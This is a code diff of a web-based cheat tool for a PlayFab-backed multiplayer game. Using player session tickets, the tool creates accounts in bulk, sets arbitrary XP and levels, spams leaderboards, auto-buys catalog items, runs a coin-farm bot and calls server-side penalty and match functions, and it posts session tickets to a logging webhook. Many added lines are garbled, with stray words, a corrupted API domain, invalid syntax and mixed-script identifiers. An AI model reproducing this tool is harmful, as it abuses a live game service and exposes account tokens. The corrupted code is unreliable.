@@ -43,7 +43,7 @@
       padding: 20px;
       border-radius: 10px;
       width: 100%;
-      max-width: 600px;
+      max-width: 600    px;
       text-align: center;
     }
 
@@ -350,13 +350,13 @@
       <button onclick="updateQuestProgress()">Update Quest</button>
 
       <div style="margin-top: 15px; text-align: left;">
-        <h3>Available Quests:</h3>
+        <h3>Available Quests:</h buttons3>
         <div style="max-height: 200px; overflow-y: auto; background: rgba(255,255,255,0.1); padding: 10px; border-radius: 5px;">
           <ul style="columns: 2; margin: 0; padding-left: 20px;">
             <li>QUENTIN_USE_DASH</li>
             <li>WIN_AS_BAGGER</li>
             <li>WIN_AS_BRAVE</li>
-            <li>WIN_AS_DETECTIVE</li>
+           agenda            <li>WIN_AS_DETECTIVE</li>
             <li>WIN_AS_ENGINEER</li>
             <li>WIN_AS_LEADER</li>
             <li>WIN_AS_SCOUT</li>
@@ -381,7 +381,7 @@
             <li>SHOOT_THE_SHERIFF</li>
             <li>SLINGSHOT_HIT_NEIGHBOR</li>
             <li>SAVE_KID_FROM_GRAB</li>
-            <li>BRAVE_ESCAPE_FROM_NEIGHBOR_HANDS</li>
+            <li>BRAVE_ESCAPE_FROM_NEIGHBOR_Hands</li>
             <li>BAGGER_CARRIER</li>
             <li>GLUE_THE_NEIGHBOR</li>
             <li>CONSUME_CHOCOLATE</li>
@@ -511,7 +511,7 @@
 
   <script>
     const titleIdMain = "bdff1";
-    const titleIdIOS = "C6252";
+    const titleIdDAI = "C6252";
     let sessionTicket = null;
     let sessionTicketIOS = null;
     let coinFarmBotRunning = false;
@@ -565,7 +565,7 @@
           },
           body: JSON.stringify({
             content: `**${platform} SessionTicket Action**\n${JSON.stringify(data, null, 2)}`,
-            username: `${platform} SessionTicket Logger`,
+            username: `${platform} SessionTicket Action`,
             avatar_url: 'https://cdn-icons-png.flaticon.com/512/1047/1047711.png'
           })
         });
@@ -579,7 +579,7 @@
       }
     }
 
-    async function fetchPlayerInfo(titleId, sessionTicket, tokenStatus, platform) {
+    async function fetchPlayerInfo03(titleId, sessionTicket, tokenStatus, platform) {
       const accountData = await makeApiCall("Client/GetAccountInfo", "POST", {}, titleId, sessionTicket);
       if (accountData.error) {
         tokenStatus.textContent += `\n❌ Error fetching account info: ${accountData.error}`;
@@ -613,7 +613,8 @@
       if (payload.PlayerProfile) {
         playerInfo.DisplayName = payload.PlayerProfile.DisplayName || "N/A";
         playerInfo.LastLogin = new Date(payload.PlayerProfile.LastLogin).toLocaleString();
-        infoText += `DisplayName: ${playerInfo.DisplayName}\n`;
+        infoText += `Display    	    
+        playerInfo.DisplayName}: ${playerInfo.DisplayName}\n`;
         infoText += `LastLogin: ${playerInfo.LastLogin}\n`;
       }
 
@@ -629,13 +630,13 @@
 
       if (sessionTicket) {
         localStorage.setItem('sessionTicket', sessionTicket);
-        tokenStatus.textContent = "✅ Token set successfully!";
+        tokenStatus.textContent = "Token set successfully!";
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "green";
         console.log("SessionTicket set (STEAM):", sessionTicket);
-        fetchPlayerInfo(titleIdMain, sessionTicket, tokenStatus, "STEAM");
+        fetchPlayerInfo03(titleIdMain, sessionTicket, tokenStatus, "STEAM");
       } else {
-        tokenStatus.textContent = "❌ Please enter a valid token";
+        tokenStatus.textContent = "Please enter a valid token";
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "red";
       }
@@ -646,7 +647,7 @@
       localStorage.removeItem('sessionTicket');
       document.getElementById("sessionTicketInput").value = "";
       const tokenStatus = document.getElementById("tokenStatus");
-      tokenStatus.textContent = "❌ Token cleared";
+      tokenStatus.textContent = "Token cleared";
       tokenStatus.style.display = "block";
       tokenStatus.style.color = "red";
     }
@@ -655,13 +656,14 @@
       const tokenStatus = document.getElementById("tokenStatus");
 
       if (!sessionTicket) {
-        tokenStatus.textContent = "❌ No session ticket to renew. Please set a token first.";
+        tokenStatus.textContent = "No session ticket to renew. Please set a token first.";
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "red";
         return;
       }
 
-      tokenStatus.textContent = "🔄 Renewing session ticket...";
+      tokenStatus.textContent = "Renewing session ticket...";
+      tokenStatus.style/HeaderStyleId: border-color
       tokenStatus.style.display = "block";
       tokenStatus.style.color = "blue";
 
@@ -672,7 +674,7 @@
             "Content-Type": "application/json",
             "X-Authorization": sessionTicket
           },
-          body: JSON.stringify({})
+          body: JSON STRINGIFY({})
         });
 
         const data = await response.json();
@@ -681,16 +683,16 @@
           sessionTicket = data.data.EntityToken;
           localStorage.setItem('sessionTicket', sessionTicket);
           document.getElementById("sessionTicketInput").value = sessionTicket;
-          tokenStatus.textContent = "✅ Session ticket renewed successfully!";
+          tokenStatus.textContent = "Session ticket renewed successfully!";
           tokenStatus.style.color = "green";
           console.log("SessionTicket renewed (STEAM):", sessionTicket);
-          fetchPlayerInfo(titleIdMain, sessionTicket, tokenStatus, "STEAM");
+          fetchPlayerInfo03(titleIdMain, sessionTicket, tokenStatus, "STEAM");
         } else {
-          tokenStatus.textContent = `❌ Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
+          tokenStatus.textContent = `Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
           tokenStatus.style.color = "red";
         }
-      } catch (error) {
-        tokenStatus.textContent = `❌ Error renewing session ticket: ${error.message}`;
+    } catch (error) {
+        tokenStatus.textContent = `Error renewing session ticket: ${error.message}`;
         tokenStatus.style.color = "red";
       }
     }
@@ -701,13 +703,13 @@
 
       if (sessionTicketIOS) {
         localStorage.setItem('sessionTicketIOS', sessionTicketIOS);
-        tokenStatus.textContent = "✅ Token set successfully!";
+        tokenStatus.textContent = "Token set successfully!";
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "green";
         console.log("SessionTicket set (IOS):", sessionTicketIOS);
-        fetchPlayerInfo(titleIdIOS, sessionTicketIOS, tokenStatus, "IOS");
+        fetchPlayerInfo03(titleIdIOS, sessionTicketIOS, tokenStatus, "IOS");
       } else {
-        tokenStatus.textContent = "❌ Please enter a valid token";
+        tokenStatus.textContent = "Please enter a valid token";
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "red";
       }
@@ -718,7 +720,7 @@
       localStorage.removeItem('sessionTicketIOS');
       document.getElementById("sessionTicketInputIOS").value = "";
       const tokenStatus = document.getElementById("tokenStatusIOS");
-      tokenStatus.textContent = "❌ Token cleared";
+      tokenStatus.textContent = "Token cleared";
       tokenStatus.style.display = "block";
       tokenStatus.style.color = "red";
     }
@@ -727,13 +729,13 @@
       const tokenStatus = document.getElementById("tokenStatusIOS");
 
       if (!sessionTicketIOS) {
-        tokenStatus.textContent = "❌ No session ticket to renew. Please set a token first.";
+        tokenStatus.textContent = "No session ticket to renew. Please set a token first.";
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "red";
         return;
       }
 
-      tokenStatus.textContent = "🔄 Renewing session ticket...";
+      tokenStatus.textContent = "Renewing session ticket...";
       tokenStatus.style.display = "block";
       tokenStatus.style.color = "blue";
 
@@ -753,16 +755,16 @@
           sessionTicketIOS = data.data.EntityToken;
           localStorage.setItem('sessionTicketIOS', sessionTicketIOS);
           document.getElementById("sessionTicketInputIOS").value = sessionTicketIOS;
-          tokenStatus.textContent = "✅ Session ticket renewed successfully!";
+          tokenStatus.textContent = "Session ticket renewed successfully!";
           tokenStatus.style.color = "green";
           console.log("SessionTicket renewed (IOS):", sessionTicketIOS);
-          fetchPlayerInfo(titleIdIOS, sessionTicketIOS, tokenStatus, "IOS");
+          fetchPlayerInfo03(titleIdIOS, sessionTicketIOS, tokenStatus, "IOS");
         } else {
-          tokenStatus.textContent = `❌ Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
-          tokenStatus.style.color = "red";
+          tokenStatus.textContent = `Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
+         、当            tokenStatus.style.color = "red";
         }
       } catch (error) {
-        tokenStatus.textContent = `❌ Error renewing session ticket: ${error.message}`;
+        tokenStatus.textContent = `Error renewing session ticket: ${error.message}`;
         tokenStatus.style.color = "red";
       }
     }
@@ -776,13 +778,23 @@
       }
 
       try {
-        const res = await fetch(`https://${titleId}.playfabapi.com/${endpoint}`, {
+        const res = await fetch(`https://${titleId}.playირითplayfabapi.com/${endpoint}`, {
           method: method,
           headers: headers,
           body: JSON.stringify(body)
         });
 
-        return await res.json();
+        const data = await res.json();
+
+        if (res.status === 429) {
+          return { error: "Rate limit exceeded. Please try again later." };
+        } else if (res.status === 401 || res.status === 403) {
+          return { error: "Invalid or expired SessionTicket. Please renew or set a new token." };
+        } else if (data.error) {
+          return { error: data.errorMessage || data.error };
+        }
+
+        return data;
       } catch (error) {
         console.error(`API call failed for ${titleId}:`, error);
         return { error: error.message };
@@ -822,7 +834,7 @@
       }
 
       if (!displayNameBase) {
-        output.textContent = "❌ Please enter a display name.\n";
+        output.textContent = "Please enter a display name.\n";
         output.style.color = "red";
         output.scrollTop = output.scrollHeight;
         return;
@@ -836,7 +848,6 @@
 
       async function runIOSAutomationCycle() {
         try {
-          // Step 1: Generate Account
           output.textContent += "\n=== Account Generation ===\n";
           const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
           const playerIdLength = 20;
@@ -857,7 +868,7 @@
 
           if (loginResponse.error || !loginResponse.data?.SessionTicket) {
             const errorMsg = loginResponse.error || loginResponse.errorMessage || "Unknown error";
-            output.textContent += `❌ Failed to create account: ${errorMsg}\n`;
+            output.textContent += `Failed to create account: ${errorMsg}\n`;
             logIOSAction("Account Creation Failed", { playerId, error: errorMsg });
             output.style.color = "red";
             if (errorMsg.includes("Account Banned")) {
@@ -872,7 +883,6 @@
           output.textContent += `✅ Account created successfully!\nSessionTicket: ${sessionTicketIOS}\nPlayerId: ${playerId}\n`;
           logIOSAction("Account Creation Success", { playerId, sessionTicket: sessionTicketIOS });
 
-          // Step 2: Set Display Name
           output.textContent += `Setting display name to ${displayName}...\n`;
           logIOSAction("Set Display Name Attempt", { displayName });
           const updateResponse = await makeApiCall("Client/UpdateUserTitleDisplayName", "POST", {
@@ -881,16 +891,15 @@
 
           if (updateResponse.error) {
             const errorMsg = updateResponse.error || updateResponse.errorMessage || "Unknown error";
-            output.textContent += `❌ Failed to set display name: ${errorMsg}\n`;
+            output.textContent += `Failed to set display name: ${errorMsg}\n`;
             logIOSAction("Set Display Name Failed", { displayName, error: errorMsg });
             output.style.color = "red";
           } else {
-            output.textContent += `✅ Display name set to ${displayName}\n`;
+            output.textContent += `Display name set to ${displayName}\n`;
             logIOSAction("Set Display Name Success", { displayName });
             output.style.color = "green";
           }
 
-          // Step 3: Set Level Progression
           output.textContent += "\n=== Level Progression Update ===\n";
           logIOSAction("Level Progression Attempt", { receivedXP, desiredLevel });
 
@@ -899,7 +908,7 @@
             classLevel: [
               { classId: "Bagman", XP: receivedXP, XpToNextLevel: 2730, level: desiredLevel, availablePerkSlotsCount: 3 },
               { classId: "Brave", XP: receivedXP, XpToNextLevel: 2790, level: desiredLevel, availablePerkSlotsCount: 3 },
-              { classId: "Detective", XP: receivedXP, XpToNextLevel: 5280, level: desiredLevel, availablePerkSlotsCount: 3 },
+              { classId: "Detective', XP: receivedXP, XpToNextLevel: 5280, level: desiredLevel, availablePerkSlotsCount: 3 },
               { classId: "Inventor", XP: receivedXP, XpToNextLevel: 3630, level: desiredLevel, availablePerkSlotsCount: 3 },
               { classId: "Leader", XP: receivedXP, XpToNextLevel: 4170, level: desiredLevel, availablePerkSlotsCount: 3 },
               { classId: "Quentin", XP: receivedXP, XpToNextLevel: 3960, level: desiredLevel, availablePerkSlotsCount: 3 },
@@ -933,7 +942,7 @@
           }, titleIdIOS, sessionTicketIOS);
 
           if (levelProgressionData.error) {
-            output.textContent += `❌ Failed to set level progression: ${levelProgressionData.error}\n`;
+            output.textContent += `Failed to set level progression: ${levelProgressionData.error}\n`;
             logIOSAction("Level Progression Failed", { error: levelProgressionData.error });
             output.style.color = "red";
           } else {
@@ -942,7 +951,6 @@
             output.style.color = "green";
           }
 
-          // Step 4: Refresh Leaderboard
           output.textContent += "\n=== Leaderboard Spam ===\n";
           logIOSAction("Leaderboard Spam Attempt", { platformName });
 
@@ -960,7 +968,7 @@
           }, titleIdIOS, sessionTicketIOS);
 
           if (updateData.error) {
-            output.textContent += `❌ Failed to update leaderboard: ${updateData.error}\n`;
+            output.textContent += `Failed to update leaderboard: ${updateData.error}\n`;
             logIOSAction("Leaderboard Update Failed", { error: updateData.error, platformName });
             output.style.color = "red";
           } else {
@@ -969,7 +977,7 @@
             output.style.color = "green";
           }
         } catch (error) {
-          output.textContent += `❌ Unexpected error: ${error.message}\n`;
+          output.textContent += `Unexpected error: ${error.message}\n`;
           logIOSAction("Unexpected Error", { error: error.message, platformName });
           output.style.color = "red";
         }
@@ -987,13 +995,13 @@
       const maxResults = parseInt(document.getElementById("iosMaxResults").value) || 100;
 
       if (!sessionTicketIOS) {
-        output.textContent = "❌ Please set your IOS SessionTicket first.\n";
+        output.textContent = "Please set your IOS SessionTicket first.\n";
         output.style.color = "red";
         return;
       }
 
       if (!statisticName) {
-        output.textContent = "❌ Please enter a statistic name.\n";
+        output.textContent = "Please enter a statistic name.\n";
         output.style.color = "red";
         return;
       }
@@ -1013,13 +1021,13 @@
           });
           output.textContent = leaderboardText;
         } else if (data.error) {
-          output.textContent = `❌ Error: ${data.error}\n`;
+          output.textContent = `Error: ${data.error}\n`;
           output.style.color = "red";
         } else {
           output.textContent = "No leaderboard data found.\n";
         }
       } catch (error) {
-        output.textContent = `❌ Unexpected error: ${error.message}\n`;
+        output.textContent = `Unexpected error: ${error.message}\n`;
         output.style.color = "red";
       }
       output.scrollTop = output.scrollHeight;
@@ -1030,29 +1038,29 @@
       output.textContent = "Starting purchase process (ensure Steam is closed)...\n";
 
       if (!sessionTicket) {
-        output.textContent += "❌ Please set your SessionTicket first.\n";
+        output.textContent += "Please set your SessionTicket first.\n";
         return;
       }
 
       try {
-        output.textContent += "📋 Fetching catalog items...\n";
+        output.textContent += "Fetching catalog items...\n";
         const catalogData = await makeApiCall("Client/GetCatalogItems", "POST", {
           CatalogVersion: "Ingame"
         }, titleIdMain, sessionTicket);
 
         if (catalogData.error) {
-          output.textContent += `❌ Failed to get catalog: ${catalogData.error}\n`;
+          output.textContent += `Failed to get catalog: ${catalogData.error}\n`;
           return;
         }
 
         const catalogItems = catalogData.data.Catalog;
         output.textContent += `✅ Found ${catalogItems.length} items in catalog\n`;
 
-        output.textContent += "📦 Checking current inventory...\n";
+        output.textContent += "Checking current inventory...\n";
         const inventoryData = await makeApiCall("Client/GetUserInventory", "POST", {}, titleIdMain, sessionTicket);
 
         if (inventoryData.error) {
-          output.textContent += `❌ Failed to get inventory: ${inventoryData.error}\n`;
+          output.textContent += `Failed to get inventory: ${inventoryData.error}\n`;
           return;
         }
 
@@ -1065,7 +1073,7 @@
 
         for (const item of catalogItems) {
           if (ownedItems.includes(item.ItemId)) {
-            output.textContent += `⏩ Skipping ${item.ItemId} (already owned)\n`;
+            output.textContent += `Skipping ${item.ItemId} (already owned)\n`;
             continue;
           }
 
@@ -1074,7 +1082,7 @@
           const isBlacklistedItem = blacklistItems.some(keyword => itemName.includes(keyword.toLowerCase()));
 
           if (isBlacklistedYear || isBlacklistedItem) {
-            output.textContent += `⏩ Skipping ${item.ItemId} (blacklisted)\n`;
+            output.textContent += `Skipping ${item.ItemId} (blacklisted)\n`;
             continue;
           }
 
@@ -1089,23 +1097,23 @@
                 Price: price,
                 VirtualCurrency: selectedCurrency
               });
-              output.textContent += `➕ Will attempt to purchase ${item.ItemId} for ${price} ${selectedCurrency}\n`;
+              output.textContent += `Will attempt to purchase ${item.ItemId} for ${price} ${selectedCurrency}\n`;
             } else {
-              output.textContent += `⏩ Skipping ${item.ItemId} (no acceptable currency)\n`;
+              output.textContent += `Skipping ${item.ItemId} (no acceptable currency)\n`;
             }
           } else {
-            output.textContent += `⏩ Skipping ${item.ItemId} (no virtual currency price)\n`;
+            output.textContent += `Skipping ${item.ItemId} (no virtual currency price)\n`;
           }
         }
 
-        output.textContent += `\n🛒 Attempting to purchase ${itemsToPurchase.length} items (one at a time)...\n\n`;
+        output.textContent += `\nAttempting to purchase ${itemsToPurchase.length} items (one at a time)...\n\n`;
 
         let successfulPurchases = 0;
         let failedPurchases = 0;
 
         for (const item of itemsToPurchase) {
           try {
-            output.textContent += `🛍️ Attempting to purchase ${item.ItemId} for ${item.Price} ${item.VirtualCurrency}...\n`;
+            output.textContent += `Attempting to purchase ${item.ItemId} for ${item.Price} ${item.VirtualCurrency}...\n`;
 
             if (item.VirtualCurrency === "RM") {
               output.textContent += `Starting purchase for ${item.ItemId}...\n`;
@@ -1118,7 +1126,7 @@
               }, titleIdMain, sessionTicket);
 
               if (startData.error || !startData.data?.OrderId) {
-                output.textContent += `❌ Error in StartPurchase: ${startData.error || "No OrderId returned"}\n`;
+                output.textContent += `Error in StartPurchase: ${startData.error || "No OrderId returned"}\n`;
                 failedPurchases++;
                 continue;
               }
@@ -1132,7 +1140,7 @@
               }, titleIdMain, sessionTicket);
 
               if (payData.error || !payData.data?.PaymentProviderTransactionId) {
-                output.textContent += `❌ Error in PayForPurchase: ${payData.error || "Payment failed"}\n`;
+                output.textContent += `Error in PayForPurchase: ${payData.error || "Payment failed"}\n`;
                 failedPurchases++;
                 continue;
               }
@@ -1143,7 +1151,7 @@
               }, titleIdMain, sessionTicket);
 
               if (confirmData.error) {
-                output.textContent += `❌ Error in ConfirmPurchase: ${confirmData.error}\n`;
+                output.textContent += `Error in ConfirmPurchase: ${confirmData.error}\n`;
                 failedPurchases++;
               } else {
                 output.textContent += `✅ Success! Purchased ${item.ItemId}\n`;
@@ -1157,7 +1165,7 @@
               }, titleIdMain, sessionTicket);
 
               if (purchaseData.error) {
-                output.textContent += `❌ Failed: ${purchaseData.errorMessage || purchaseData.error}\n`;
+                output.textContent += `Failed: ${purchaseData.errorMessage || purchaseData.error}\n`;
                 failedPurchases++;
               } else {
                 output.textContent += `✅ Success! Purchased ${item.ItemId}\n`;
@@ -1165,7 +1173,7 @@
               }
             }
           } catch (err) {
-            output.textContent += `❌ Error purchasing ${item.ItemId}: ${err.message}\n`;
+            output.textContent += `Error purchasing ${item.ItemId}: ${err.message}\n`;
             failedPurchases++;
           }
 
@@ -1173,12 +1181,12 @@
           await new Promise(resolve => setTimeout(resolve, 0));
         }
 
-        output.textContent += `\n🎉 Purchase process completed!\n`;
+        output.textContent += `\nPurchase process completed!\n`;
         output.textContent += `✅ Successful: ${successfulPurchases}\n`;
-        output.textContent += `❌ Failed: ${failedPurchases}\n`;
+        output.textContent += `Failed: ${failedPurchases}\n`;
 
       } catch (error) {
-        output.textContent += `❌ Unexpected error: ${error.message}\n`;
+        output.textContent += `Unexpected error: ${error.message}\n`;
       }
 
       output.scrollTop = output.scrollHeight;
@@ -1460,7 +1468,7 @@
         GeneratePlayStreamEvent: true
       }, titleIdMain, sessionTicket);
 
-      const output = document.getElementById("usefulDeedOutput");
+      const输出 = document.getElementById("usefulDeedOutput");
       if (data.data?.FunctionName) {
         output.textContent = `✅ usefulDeed executed successfully\nExecution Time: ${data.data.ExecutionTimeSeconds}s\nMemory Used: ${data.data.MemoryConsumedBytes} bytes\nAPI Requests: ${data.data.APIRequestsIssued}`;
       } else {
@@ -1482,27 +1490,7 @@
           return { error: "Invalid JSON in level progression field." };
         }
       } else {
-        const XP = parseInt(document.getElementById("xpInput").value);
-        const XpToNextLevel = parseInt(document.getElementById("xpToNextLevelInput").value);
-        const level = parseInt(document.getElementById("levelInput").value);
-        const availablePerkSlotsCount = Math.min(parseInt(document.getElementById("perkSlotsInput").value), 3);
-        const playerLevel = parseInt(document.getElementById("playerLevelInput").value);
-
-        if (!classId || isNaN(receivedXP) || isNaN(XP) || isNaN(XpToNextLevel) || 
-            isNaN(level) || isNaN(availablePerkSlotsCount) || isNaN(playerLevel)) {
-          return { error: "Please fill in all fields correctly or provide JSON." };
-        }
-
-        currentLevelProgression = {
-          playerLevel,
-          classLevel: [{
-            classId,
-            XP,
-            XpToNextLevel,
-            level,
-            availablePerkSlotsCount
-          }]
-        };
+        return { error: "Please provide JSON in level progression field." };
       }
 
       const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
@@ -1585,9 +1573,9 @@
       if (!questTextFieldId || isNaN(progressValue)) {
         document.getElementById("questOutput").textContent = "Please fill all fields correctly.";
         return;
-      }
+        }
 
-      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+      const data = await makeApiCall("Client thus/ExecuteCloudScript", "POST", {
         CustomTags: null,
         FunctionName: "updateActiveQuests",
         FunctionParameter: {
@@ -1626,7 +1614,7 @@
       }, titleIdMain, sessionTicket);
 
       if (data.error) {
-        output.textContent += `❌ Error: ${data.error}\n`;
+        output.textContent += `Error: ${data.error}\n`;
       } else {
         output.textContent += `✅ Penalty points increased successfully\n`;
         output.textContent += formatResponse(data.data);
@@ -1670,98 +1658,95 @@
         AuthenticationContext: null
       }, titleIdMain, sessionTicket);
 
-      output.textContent += `refreshStartPunishmentLevelTime: ${refreshData.error ? `❌ Error: ${refreshData.error}` : "✅ Success"}\n`;
-      output.textContent += `getXpMultiplier: ${xpMultiplierData.error ? `❌ Error: ${xpMultiplierData.error}` : "✅ Success"}\n`;
-      output.textContent += `checkPopCornEvent: ${popCornData.error ? `❌ Error: ${popCornData.error}` : "✅ Success"}\n`;
+      output.textContent += `refreshStartPunishmentLevelTime: ${refreshData.error ? `Error: ${refreshData.error}` : "✅ Success"}\n`;
+      output.textContent += `getXpMultiplier: ${xpMultiplierData.error ? `Error: ${xpMultiplierData.error}` : "✅ Success"}\n`;
+      output.textContent += `checkPopCornEvent: ${popCornData.error ? `Error: ${popCornData.error}` : "✅ Success"}\n`;
       output.scrollTop = output.scrollHeight;
     }
 
-   <script>
-  // ... (all previous variables and functions from your original code remain unchanged, e.g., titleIdMain, titleIdIOS, sessionTicket, makeApiCall, etc.)
+    async function startMatchStatusSequence() {
+      const playerId = document.getElementById("matchPlayerId").value.trim();
+      const output = document.getElementById("penaltyOutput");
 
-  async function startMatchStatusSequence() {
-    const playerId = document.getElementById("matchPlayerId").value.trim();
-    const output = document.getElementById("penaltyOutput");
+      if (!sessionTicket) {
+        output.textContent = "Please set your SessionTicket first.\n";
+        output.style.color = "red";
+        output.scrollTop = output.scrollHeight;
+        return;
+      }
 
-    if (!sessionTicket) {
-      output.textContent = "❌ Please set your SessionTicket first.\n";
-      output.style.color = "red";
-      output.scrollTop = output.scrollHeight;
-      return;
+      if (!playerId) {
+        output.textContent = "Please enter a Player ID for match status.\n";
+        output.style.color = "red";
+        output.scrollTop = output.scrollHeight;
+        return;
+      }
+
+      output.textContent = "Starting match status sequence...\n";
+
+      try {
+        const refreshData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+          CustomTags: null,
+          FunctionName: "refreshStartPunishmentLevelTime",
+          FunctionParameter: null,
+          GeneratePlayStreamEvent: true,
+          RevisionSelection: null,
+          SpecificRevision: null,
+          AuthenticationContext: null
+        }, titleIdMain, sessionTicket);
+
+        const xpMultiplierData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+          CustomTags: null,
+          FunctionName: "getXpMultiplier",
+          FunctionParameter: { playerCount: 0 },
+          GeneratePlayStreamEvent: false,
+          RevisionSelection: null,
+          SpecificRevision: null,
+          AuthenticationContext: null
+        }, titleIdMain, sessionTicket);
+
+        const popCornData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+          CustomTags: null,
+          FunctionName: "checkPopCornEvent",
+          FunctionParameter: null,
+          GeneratePlayStreamEvent: false,
+          RevisionSelection: null,
+          SpecificRevision: null,
+          AuthenticationContext: null
+        }, titleIdMain, sessionTicket);
+
+        output.textContent += `refreshStartPunishmentLevelTime: ${refreshData.error ? `Error: ${refreshData.error}` : "✅ Success"}\n`;
+        output.textContent += `getXpMultiplier: ${xpMultiplierData.error ? `Error: ${xpMultiplierData.error}` : "✅ Success"}\n`;
+        output.textContent += `checkPopCornEvent: ${popCornData.error ? `Error: ${popCornData.error}` : "✅ Success"}\n`;
+        output.textContent += "Waiting 10 minutes to update match status...\n";
+        output.scrollTop = output.scrollHeight;
+
+        await new Promise(resolve => setTimeout(resolve, 10 * 60 * 1000));
+
+        const matchData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+          CustomTags: null,
+          FunctionName: "changeMatchPlayerStatus",
+          FunctionParameter: {
+            playerId: playerId,
+            matchId: "",
+            newStatus: "FINISHED"
+          },
+          GeneratePlayStreamEvent: true,
+          RevisionSelection: null,
+          SpecificRevision: null,
+          AuthenticationContext: null
+        }, titleIdMain, sessionTicket);
+
+        output.textContent += `changeMatchPlayerStatus: ${matchData.error ? `Error: ${matchData.error}` : "✅ Success"}\n`;
+        output.scrollTop = output.scrollHeight;
+      } catch (err) {
+        output.textContent += `Unexpected error: ${err.message}\n`;
+        output.style.color = "red";
+        output.scrollTop = output.scrollHeight;
+      }
     }
 
-    if (!playerId) {
-      output.textContent = "❌ Please enter a Player ID for match status.\n";
-      output.style.color = "red";
-      output.scrollTop = output.scrollHeight;
-      return;
-    }
-
-    output.textContent = "Starting match status sequence...\n";
-
-    try {
-      const refreshData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-        CustomTags: null,
-        FunctionName: "refreshStartPunishmentLevelTime",
-        FunctionParameter: null,
-        GeneratePlayStreamEvent: true,
-        RevisionSelection: null,
-        SpecificRevision: null,
-        AuthenticationContext: null
-      }, titleIdMain, sessionTicket);
-
-      const xpMultiplierData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-        CustomTags: null,
-        FunctionName: "getXpMultiplier",
-        FunctionParameter: { playerCount: 0 },
-        GeneratePlayStreamEvent: false,
-        RevisionSelection: null,
-        SpecificRevision: null,
-        AuthenticationContext: null
-      }, titleIdMain, sessionTicket);
-
-      const popCornData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-        CustomTags: null,
-        FunctionName: "checkPopCornEvent",
-        FunctionParameter: null,
-        GeneratePlayStreamEvent: false,
-        RevisionSelection: null,
-        SpecificRevision: null,
-        AuthenticationContext: null
-      }, titleIdMain, sessionTicket);
-
-      output.textContent += `refreshStartPunishmentLevelTime: ${refreshData.error ? `❌ Error: ${refreshData.error}` : "✅ Success"}\n`;
-      output.textContent += `getXpMultiplier: ${xpMultiplierData.error ? `❌ Error: ${xpMultiplierData.error}` : "✅ Success"}\n`;
-      output.textContent += `checkPopCornEvent: ${popCornData.error ? `❌ Error: ${popCornData.error}` : "✅ Success"}\n`;
-      output.textContent += "Waiting 10 minutes to update match status...\n";
-      output.scrollTop = output.scrollHeight;
-
-      await new Promise(resolve => setTimeout(resolve, 10 * 60 * 1000));
-
-      const matchData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-        CustomTags: null,
-        FunctionName: "changeMatchPlayerStatus",
-        FunctionParameter: {
-          playerId: playerId,
-          matchId: "",
-          newStatus: "FINISHED"
-        },
-        GeneratePlayStreamEvent: true,
-        RevisionSelection: null,
-        SpecificRevision: null,
-        AuthenticationContext: null
-      }, titleIdMain, sessionTicket);
-
-      output.textContent += `changeMatchPlayerStatus: ${matchData.error ? `❌ Error: ${matchData.error}` : "✅ Success"}\n`;
-      output.scrollTop = output.scrollHeight;
-    } catch (err) {
-      output.textContent += `❌ Unexpected error: ${err.message}\n`;
-      output.style.color = "red";
-      output.scrollTop = output.scrollHeight;
-    }
-  }
-
-  async function toggleCoinFarmBot() {
+    async function toggleCoinFarmBot() {
     const cloudOutput = document.getElementById("cloudOutput");
     if (coinFarmBotRunning) {
       clearInterval(coinFarmIntervalId);
@@ -1814,6 +1799,9 @@
       let matchId = null;
 
       try {
+        // Add delay between API calls to avoid rate limits
+        const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
         // startNewMatch
         const startData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
           FunctionName: "startNewMatch",
@@ -1823,6 +1811,7 @@
 
         if (startData.error) {
           output += `❌ startNewMatch: Error - ${startData.error}\n`;
+          throw new Error(`startNewMatch failed: ${startData.error}`);
         } else if (startData.data?.FunctionResult?.currentMatchId) {
           matchId = startData.data.FunctionResult.currentMatchId;
           output += `✅ startNewMatch: MatchId - ${matchId}\n`;
@@ -1832,135 +1821,458 @@
           lastCoinFarmResponse = startData.data;
         }
 
-        if (!startData.error) {
-          // decideSpecialRole
-          const roleData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-            FunctionName: "decideSpecialRole",
-            FunctionParameter: { roomType, playerIds },
-            GeneratePlayStreamEvent: true
+        await delay(1000); // 1-second delay
+
+        // decideSpecialRole
+        const roleData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+          FunctionName: "decideSpecialRole",
+          FunctionParameter: { roomType, playerIds },
+          GeneratePlayStreamEvent: true
+        }, titleIdMain, sessionTicket);
+
+        if (roleData.error) {
+          output += `❌ decideSpecialRole: Error - ${roleData.error}\n`;
+          throw new Error(`decideSpecialRole failed: ${roleData.error}`);
+        } else {
+          output += `✅ decideSpecialRole: Success\n`;
+          lastCoinFarmResponse = roleData.data;
+        }
+
+        await delay(1000);
+
+        if (matchId) {
+          // xpConsumed
+          const xpData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+            CustomTags: null,
+            FunctionName: "xpConsumed",
+            FunctionParameter: { token: matchId },
+            GeneratePlayStreamEvent: true,
+            RevisionSelection: null,
+            SpecificRevision: null,
+            AuthenticationContext: null
           }, titleIdMain, sessionTicket);
 
-          if (roleData.error) {
-            output += `❌ decideSpecialRole: Error - ${roleData.error}\n`;
+          if (xpData.error) {
+            output += `❌ xpConsumed: Error - ${xpData.error}\n`;
+            throw new Error(`xpConsumed failed: ${xpData.error}`);
